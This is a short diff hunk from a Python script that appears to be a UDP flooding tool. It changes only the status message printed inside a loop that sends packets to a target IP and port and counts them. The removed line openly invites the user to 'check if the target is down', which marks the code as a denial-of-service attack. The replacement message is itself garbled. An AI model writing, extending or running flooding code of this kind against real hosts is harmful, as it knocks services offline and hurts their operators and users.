@@ -66,7 +66,7 @@ while True:
             pass
         sock.sendto(bytes, (ip, port))
         sent += 1
-        print(colored("Packets are being sent like crazy, check if the target is down... we sent %s packets to this Target: %s" % (
+        print(colored("Packets target sent %s packets  Target: %s" % (
             sent, ip), 'green'))
     except KeyboardInterrupt:
         sys.exit()
